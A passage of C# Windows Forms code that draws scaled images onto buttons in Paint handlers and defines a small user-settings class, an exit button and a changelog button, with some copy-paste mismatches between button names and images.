            int newHeight = (int)(button2Image.Height * scale);
            int x = 5;
            int y = (button1.Height - newHeight) / 2;

            e.Graphics.DrawImage(button3Image, new Rectangle(x, y, newWidth, newHeight));
        }

        private void button3_Paint(object sender, PaintEventArgs e)
        {
            e.Graphics.InterpolationMode = InterpolationMode.HighQualityBicubic;

            float scale = Math.Min((float)button1.Width / buttonImage.Width, (float)button1.Height / button2Image.Height) * 0.7f;
            int newWidth = (int)(button2Image.Width * scale);
            int newHeight = (int)(button2Image.Height * scale);
            int x = 5;
            int y = (button1.Height - newHeight) / 2;

            e.Graphics.DrawImage(button4Image, new Rectangle(x, y, newWidth, newHeight));
        }

        private void button6_Paint(object sender, PaintEventArgs e)
        {
            e.Graphics.InterpolationMode = InterpolationMode.HighQualityBicubic;

            float scale = Math.Min((float)button1.Width / buttonImage.Width, (float)button1.Height / button2Image.Height) * 0.7f;
            int newWidth = (int)(button2Image.Width * scale);
            int newHeight = (int)(button2Image.Height * scale);
            int x = 5;
            int y = (button1.Height - newHeight) / 2;

            e.Graphics.DrawImage(button7Image, new Rectangle(x, y, newWidth, newHeight));
        }

        private void button7_Paint(object sender, PaintEventArgs e)
        {
            e.Graphics.InterpolationMode = InterpolationMode.HighQualityBicubic;

            float scale = Math.Min((float)button1.Width / buttonImage.Width, (float)button1.Height / button2Image.Height) * 0.7f;
            int newWidth = (int)(button2Image.Width * scale);
            int newHeight = (int)(button2Image.Height * scale);
            int x = 5;
            int y = (button1.Height - newHeight) / 2;

            e.Graphics.DrawImage(button6Image, new Rectangle(x, y, newWidth, newHeight));
        }

        private void button5_Paint(object sender, PaintEventArgs e)
        {
            e.Graphics.InterpolationMode = InterpolationMode.HighQualityBicubic;

            float scale = Math.Min((float)button1.Width / buttonImage.Width, (float)button1.Height / button5Image.Height) * 0.7f;
            int newWidth = (int)(button5Image.Width * scale);
            int newHeight = (int)(button5Image.Height * scale);
            int x = 5;
            int y = (button1.Height - newHeight) / 2;

            e.Graphics.DrawImage(button5Image, new Rectangle(x, y, newWidth, newHeight));
        }

        private void clearLogsToolStripMenuItem_Click_1(object sender, EventArgs e)
        {

        }

        private class UserConfig
        {
            public bool darkMode { get; set; }
            public bool audioMute { get; set; }
            public bool notificationMute { get; set; }
        }

        private void button10_Click(object sender, EventArgs e)
        {
            Server.Classes.SFX.click();
            Environment.Exit(0);
        }

        private void button9_Click_1(object sender, EventArgs e)
        {
            Server.Classes.SFX.click();
            FormChangelog formChangelog = new FormChangelog();
            formChangelog.Show();
        }
    }
}
